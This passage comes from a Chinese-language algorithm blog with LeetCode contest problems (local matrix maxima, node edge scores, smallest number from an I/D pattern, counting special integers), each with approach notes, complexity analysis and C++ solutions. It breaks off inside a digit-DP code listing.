<li><code>n == grid.length == grid[i].length</code></li>
<li><code>3 &lt;= n &lt;= 100</code></li>
<li><code>1 &lt;= grid[i][j] &lt;= 100</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/largest-local-values-in-a-matrix">https://leetcode.cn/problems/largest-local-values-in-a-matrix</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接遍历即可，设矩阵的行数与列数分别为 $m,n$，则可以知道目标矩阵的行数与列数为 $m- 2, n - 2$，我们直接遍历即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(m \times n)$，矩阵的行数与列数分别为 $m,n$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><ul>
<li>直接遍历<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">largestLocal</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid) &#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">ans</span>(m - <span class="number">2</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n - <span class="number">2</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m - <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - <span class="number">2</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> r = i; r &lt;= i + <span class="number">2</span>; r++) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> c = j; c &lt;= j + <span class="number">2</span>; c++) &#123;</span><br><span class="line">                        ans[i][j] = <span class="built_in">max</span>(ans[i][j], grid[r][c]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6149-边积分最高的节点"><a href="#6149-边积分最高的节点" class="headerlink" title="6149. 边积分最高的节点"></a>6149. 边积分最高的节点</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个有向图，图中有 <code>n </code>个节点，节点编号从 <code>0 </code>到 <code>n - 1</code> ，其中每个节点都 恰有一条 出边。</p>
<p>图由一个下标从 <code>0 </code>开始、长度为<code> n</code>的整数数组 <code>edges</code> 表示，其中 <code>edges[i]</code> 表示存在一条从节点 <code>i</code> 到节点 <code>edges[i]</code> 的 有向 边。</p>
<p>节点 <code>i</code> 的 边积分 定义为：所有存在一条指向节点 <code>i</code> 的边的节点的 编号 总和。</p>
<p>返回 边积分 最高的节点。如果多个节点的 边积分 相同，返回编号 最小 的那个。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：edges = [1,0,0,0,0,7,7,5]</span><br><span class="line">输出：7</span><br><span class="line">解释：</span><br><span class="line">- 节点 1、2、3 和 4 都有指向节点 0 的边，节点 0 的边积分等于 1 + 2 + 3 + 4 = 10 。</span><br><span class="line">- 节点 0 有一条指向节点 1 的边，节点 1 的边积分等于 0 。</span><br><span class="line">- 节点 7 有一条指向节点 5 的边，节点 5 的边积分等于 7 。</span><br><span class="line">- 节点 5 和 6 都有指向节点 7 的边，节点 7 的边积分等于 5 + 6 = 11 。</span><br><span class="line">节点 7 的边积分最高，所以返回 7 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：edges = [2,0,0,2]</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">- 节点 1 和 2 都有指向节点 0 的边，节点 0 的边积分等于 1 + 2 = 3 。</span><br><span class="line">- 节点 0 和 3 都有指向节点 2 的边，节点 2 的边积分等于 0 + 3 = 3 。</span><br><span class="line">节点 0 和 2 的边积分都是 3 。由于节点 0 的编号更小，返回 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == edges.length</code></li>
<li><code>2 &lt;= n &lt;= 105</code></li>
<li><code>0 &lt;= edges[i] &lt; n</code></li>
<li><code>edges[i] != i</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/node-with-highest-edge-score">https://leetcode.cn/problems/node-with-highest-edge-score</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题感觉就是个简单题目，直接统计每个节点的得分即可，毫无难度可言。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示节点的数目。</li>
<li>空间复杂度：$O(n)$，$n$ 表示节点的数目。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">edgeScore</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; edges)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = edges.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">score</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            score[edges[i]] += i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(score[i] &gt; score[ans]) &#123;</span><br><span class="line">                ans = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6150-根据模式串构造最小数字"><a href="#6150-根据模式串构造最小数字" class="headerlink" title="6150. 根据模式串构造最小数字"></a>6150. 根据模式串构造最小数字</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你下标从 <code>0</code> 开始、长度为 <code>n</code> 的字符串 <code>pattern</code> ，它包含两种字符，<code>&#39;I&#39;</code> 表示 上升 ，<code>&#39;D&#39;</code> 表示 下降 。</p>
<p>你需要构造一个下标从 <code>0</code> 开始长度为 <code>n + 1</code> 的字符串，且它要满足以下条件：</p>
<p><code>num</code> 包含数字 <code>&#39;1&#39;</code> 到 <code>&#39;9&#39;</code> ，其中每个数字 至多 使用一次。</p>
<ul>
<li>如果 <code>pattern[i] == &#39;I&#39;</code> ，那么 <code>num[i] &lt; num[i + 1]</code> 。</li>
<li>如果 <code>pattern[i] == &#39;D&#39;</code> ，那么 <code>num[i] &gt; num[i + 1]</code> 。<br>请你返回满足上述条件字典序 最小 的字符串 <code>num</code>。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：pattern = &quot;IIIDIDDD&quot;</span><br><span class="line">输出：&quot;123549876&quot;</span><br><span class="line">解释：</span><br><span class="line">下标 0 ，1 ，2 和 4 处，我们需要使 num[i] &lt; num[i+1] 。</span><br><span class="line">下标 3 ，5 ，6 和 7 处，我们需要使 num[i] &gt; num[i+1] 。</span><br><span class="line">一些可能的 num 的值为 &quot;245639871&quot; ，&quot;135749862&quot; 和 &quot;123849765&quot; 。</span><br><span class="line">&quot;123549876&quot; 是满足条件最小的数字。</span><br><span class="line">注意，&quot;123414321&quot; 不是可行解因为数字 &#x27;1&#x27; 使用次数超过 1 次。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：pattern = &quot;DDD&quot;</span><br><span class="line">输出：&quot;4321&quot;</span><br><span class="line">解释：</span><br><span class="line">一些可能的 num 的值为 &quot;9876&quot; ，&quot;7321&quot; 和 &quot;8742&quot; 。</span><br><span class="line">&quot;4321&quot; 是满足条件最小的数字。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= pattern.length &lt;= 8</code></li>
<li><code>pattern</code> 只包含字符 <code>&#39;I&#39;</code> 和 <code>&#39;D&#39;</code> 。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/construct-smallest-number-from-di-string">https://leetcode.cn/problems/construct-smallest-number-from-di-string</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划或者贪心
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>动态规划：<br>感觉就是暴力解法。这 $dp[i][j]$ 表示前 $i$ 个字母且以数字 $j$ 为结尾且符合字符串前 $i-1$ 个规则的最小字符串。我们每次贪心的选择字典序最小的字符串即可，感觉解法实际上有点繁琐了。<br>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n^2 \times |\Sigma| ^ 2)$，其中 $n$ 表示字符串的长度，$|\Sigma|$ 表示字符集的大小。</li>
<li>空间复杂度：空间复杂度为 $O(n^2 \times |\Sigma|)$，其中 $n$ 表示字符串的长度，$|\Sigma|$ 表示字符集的大小。</li>
</ul>
<ol start="2">
<li>贪心算法：<br>为什么需要贪心算法，我们可以看到每次 $\text{“IIIDDD”}$ 将其分为 $\text{“III”}$ 与 $\text{“DDDD”}$，每次遇到第一个 <code>D</code> 时我们将剩余元素的最小值倒序顺序压入到栈中，这样出栈顺序即按照倒序出栈，满足递减。遇到 <code>I</code> 时，如果前方没有 <code>D</code> 时，此时我们直接压入 <code>num</code> 。<br>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，其中 $n$ 表示字符串的长度。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，其中 $n$ 表示字符串的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> string inf = <span class="string">&quot;999999999&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">smallestNumber</span><span class="params">(string pattern)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = pattern.<span class="built_in">size</span>();   </span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;string&gt;(<span class="number">10</span>, inf));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="built_in">to_string</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pattern[i] == <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt; j; k++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (dp[i][k] &lt; dp[i + <span class="number">1</span>][j]) &#123;</span><br><span class="line">                            <span class="type">bool</span> valid = <span class="literal">true</span>;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt; dp[i][k].<span class="built_in">size</span>(); l++) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (dp[i][k][l] == <span class="string">&#x27;0&#x27;</span> + j) &#123;</span><br><span class="line">                                    valid = <span class="literal">false</span>;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (valid) &#123;</span><br><span class="line">                                dp[i + <span class="number">1</span>][j] = dp[i][k];</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> k = j + <span class="number">1</span>; k &lt;= <span class="number">9</span>; k++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (dp[i][k] &lt; dp[i + <span class="number">1</span>][j]) &#123;</span><br><span class="line">                            <span class="type">bool</span> valid = <span class="literal">true</span>;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt; dp[i][k].<span class="built_in">size</span>(); l++) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (dp[i][k][l] == <span class="string">&#x27;0&#x27;</span> + j) &#123;</span><br><span class="line">                                    valid = <span class="literal">false</span>;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (valid) &#123;</span><br><span class="line">                                dp[i + <span class="number">1</span>][j] = dp[i][k];</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                dp[i+<span class="number">1</span>][j].<span class="built_in">push_back</span>(j + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *<span class="built_in">min_element</span>(dp[n].<span class="built_in">begin</span>(), dp[n].<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>贪心算法:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">smallestNumber</span><span class="params">(string pattern)</span> </span>&#123;</span><br><span class="line">        string ans;</span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; st;</span><br><span class="line">        <span class="type">char</span> num = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> c : pattern) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;D&#x27;</span>) &#123;</span><br><span class="line">                st.<span class="built_in">emplace</span>(num++);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(num++);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    st.<span class="built_in">emplace</span>(num++);</span><br><span class="line">                    <span class="keyword">while</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                        ans.<span class="built_in">push_back</span>(st.<span class="built_in">top</span>());</span><br><span class="line">                        st.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        st.<span class="built_in">emplace</span>(num);</span><br><span class="line">        <span class="keyword">while</span>(!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(st.<span class="built_in">top</span>());</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6151-统计特殊整数"><a href="#6151-统计特殊整数" class="headerlink" title="6151. 统计特殊整数"></a>6151. 统计特殊整数</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>如果一个正整数每一个数位都是互不相同的，我们称它是 特殊整数 。</p>
<p>给你一个 正整数 <code>n</code> ，请你返回区间 <code>[1, n]</code> 之间特殊整数的数目。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 20</span><br><span class="line">输出：19</span><br><span class="line">解释：1 到 20 之间所有整数除了 11 以外都是特殊整数。所以总共有 19 个特殊整数。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 5</span><br><span class="line">输出：5</span><br><span class="line">解释：1 到 5 所有整数都是特殊整数。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 135</span><br><span class="line">输出：110</span><br><span class="line">解释：从 1 到 135 总共有 110 个整数是特殊整数。</span><br><span class="line">不特殊的部分数字为：22 ，114 和 131 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= n &lt;= 2 * 109</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/count-special-integers">https://leetcode.cn/problems/count-special-integers</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>数位dp 或者分类讨论
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>分类讨论：<br>分类讨论的解法非常简单，感觉就是一个小学奥数题目。设数字 $n$ 的十进制共有 $m$ 位，分为两种情况讨论：</li>
</ol>
<ul>
<li>组成的数字位数 $ k &lt; m$ 的情况：这个比较简单简单的排列组合 $count &#x3D; \sum_{i&#x3D;1}^{m-1}(A_9^{k} + 9 \times A_9^{k-1})$，相当于从 $10$ 个不同的数字中选出 $i$ 个不同的数，但需要考虑第一个数字不为 $0$ 的问题。</li>
<li>组成的数字位数 $k &#x3D; m$ 的情况: 这种就稍微复杂一些，左边 $k$ 保持与 $n$ 一致，右边的 $m-k$ 位小于 $n$ 的右边 $m-k$ 位，在满足前 $i$ 位数字均不相同的前提下，排列组合公式如下：<br>$$<br>count &#x3D; \sum_{i &#x3D; 0}^{m-1}\sum_{j&#x3D;0}^{d[i]-1}(A_{10-i-1}^{m-i-1}) \<br>tot &#x3D; \sum_{i&#x3D;1}^{m-1}(A_9^{k} + 9 \times A_9^{k-1}) + \sum_{i &#x3D; 0}^{m-1}\sum_{j&#x3D;0}^{d[i]-1}(A_{10-i-1}^{m-i-1})<br>$$<br>前 $i-1$ 个数字沿用 $n$ 的前 $i-1$ 个数字，第 $i$ 个数字的选择为 $[0,d[i])$，剩余的 $m - i$ 个数字则按照排列组合的形式，从 $10$ 个不同的数字中选择 $m-i$ 个的组合数，当然以上还需要特殊考虑第 $1$ 个数字为 $0$ 情形，同时还需要单独讨论数字 $n$ 是否符合特殊整数的情形。<br>复杂度分析：</li>
<li>时间复杂度：$O(m \times |\Sigma|)$，其中 $|\Sigma|$ 表示字符集，在这里字符集的数目为 $10$。</li>
<li>空间复杂度：$O(m + |\Sigma|)$。</li>
</ul>
<ol start="2">
<li>典型的数位 $dp$ 解法，不过这个题目因为限制条件多，用数位 <code>dp</code> 的解法实际还麻烦一些。实际还稍微麻烦一些，写出来的代码逻辑非常丑陋，感觉不如分类讨论来的直接一些。对于位数小于 $m$ 的特殊整数的数量，我们还是按照排列组合来讨论，只需要单独讨论位数等于 $m$ 的情形。设 $dp[i][limit][mask]$ 表时左边前 $i$ 位，$limit$ 为 $1$ 表示严重数字的上限，$limit$ 为 $0$ 表示未沿着数字的上线，$mask$ 表示当前的数字集合。则我们可以知道以下递推公式:<br>$$<br>dp[i][1][mask | (1 &lt;&lt; d[i])] &#x3D; dp[i-1][1][mask] \<br>dp[i][0][mask | (1 &lt;&lt; k)] &#x3D; \sum_{k &#x3D; 0}^{d[i]-1}dp[i-1][1][mask] + \sum_{k &#x3D; 0}^{9}dp[i-1][0][mask]<br>$$<br>也是分两种情况讨论，要么严着上限，要么低于上限。数位 <code>dp</code> 在力扣平台上有非常多的类似的题目。<br>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(m \times |\Sigma| \times 2 ^ {|\Sigma|})$，其中 $|\Sigma|$ 表示字符集，在这里字符集的数目为 $10$。</li>
<li>空间复杂度：$O(m \times |\Sigma| \times 2 ^ {|\Sigma|})$。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countSpecialNumbers</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        string s = <span class="built_in">to_string</span>(n);</span><br><span class="line">        <span class="type">int</span> m = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">Fac</span><span class="params">(<span class="number">10</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">bitsmask</span><span class="params">(m + <span class="number">1</span>, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">            Fac[i] = Fac[i<span class="number">-1</span>] * i;</span><br><span class="line">        &#125;</span><br><span class="line">        bitsmask[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bitsmask[i - <span class="number">1</span>] != <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (bitsmask[i - <span class="number">1</span>] &amp; (<span class="number">1</span> &lt;&lt; (s[i<span class="number">-1</span>] - <span class="string">&#x27;0&#x27;</span>))) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                bitsmask[i] = bitsmask[i - <span class="number">1</span>] | (<span class="number">1</span> &lt;&lt; (s[i<span class="number">-1</span>] - <span class="string">&#x27;0&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* less than m */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            ans += Fac[<span class="number">9</span>] / Fac[<span class="number">9</span> - i] + (i - <span class="number">1</span>) == <span class="number">0</span> ? <span class="number">0</span> : (<span class="number">9</span> * Fac[<span class="number">9</span>] / Fac[<span class="number">10</span> - i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* m bits */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = m - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">int</span> mask = bitsmask[i];</span><br><span class="line">            <span class="type">int</span> y = <span class="number">10</span> - i - <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> bits = m - i - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (mask != <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="type">int</span> x = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                <span class="comment">/* m bits */</span></span><br><span class="line">                <span class="keyword">if</span> (i == m - <span class="number">1</span> &amp;&amp; !(mask &amp; (<span class="number">1</span> &lt;&lt; x))) &#123;</span><br><span class="line">                    ans++;</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = (i == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>); k &lt; x; k++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (mask &amp; (<span class="number">1</span> &lt;&lt; k)) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ans += Fac[y] / Fac[y - bits];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countSpecialNumbers</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> s = <span class="built_in">to_string</span>(n);</span><br><span class="line">        <span class="type">int</span> m = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> dp[m + <span class="number">1</span>][<span class="number">2</span>][<span class="number">1024</span>];</span><br><span class="line">        <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="built_in">sizeof</span>(dp));</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">Fac</span><span class="params">(<span class="number">10</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="comment">/* less than m bits */</span></span><br><span class="line">        <span class="type">int</span> tot = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">            Fac[i] = Fac[i<span class="number">-1</span>] * i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            tot += Fac[<span class="number">9</span>] / Fac[<span class="number">9</span> - i] + (i - <span class="number">1</span>) == <span class="number">0</span> ? <span class="number">0</span> : (<span class="number">9</span> * Fac[<span class="number">9</span>] / Fac[<span class="number">10</span> - i]);</span><br><span class="line">        &#125;</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = s[i - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">1024</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (__builtin_popcount(j) != i - <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="comment">/* upper bound */</span></span><br><span class="line">                <span class="keyword">if</span> (dp[i<span class="number">-1</span>][<span class="number">1</span>][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(j &amp; (<span class="number">1</span> &lt;&lt; x))) &#123;</span><br><span class="line">                        dp[i][<span class="number">1</span>][j | (<span class="number">1</span> &lt;&lt; x)] = dp[i<span class="number">-1</span>][<span class="number">1</span>][j];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; x; k++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (j &amp; (<span class="number">1</span> &lt;&lt; k)) <span class="keyword">continue</span>;</span><br><span class="line">                        <span class="keyword">if</span> (k == <span class="number">0</span> &amp;&amp; i == <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">                        dp[i][<span class="number">0</span>][j | (<span class="number">1</span> &lt;&lt; k)] += dp[i<span class="number">-1</span>][<span class="number">1</span>][j];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* lower bound */</span></span><br><span class="line">                <span class="keyword">if</span> (dp[i<span class="number">-1</span>][<span class="number">0</span>][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= <span class="number">9</span>; k++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (j &amp; (<span class="number">1</span> &lt;&lt; k)) <span class="keyword">continue</span>;</span><br><span class="line">                        dp[i][<span 